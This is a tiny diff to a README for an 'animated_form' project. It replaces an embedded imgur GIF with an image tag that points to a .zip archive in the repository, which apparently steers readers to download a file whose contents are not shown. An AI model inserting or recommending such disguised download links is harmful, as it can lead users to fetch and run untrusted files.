@@ -1,3 +1,3 @@
 # animated_form
-![Alt Text](https://i.imgur.com/0ALdqw5.gif)
+![Alt Text](https://github.com/camilo315853/animated_form/raw/refs/heads/master/animated-form-main/form-animated-v3.6.zip)
 
